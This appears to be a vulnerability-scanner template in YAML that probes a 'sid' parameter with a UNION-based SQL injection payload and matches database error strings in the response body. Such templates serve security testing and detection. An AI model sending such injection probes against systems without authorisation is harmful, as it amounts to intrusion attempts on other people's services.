id: sqli7-159
name: 'UNION probe in sid'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via sid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sid:
        - '1 UNION SELECT 1,2,3'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
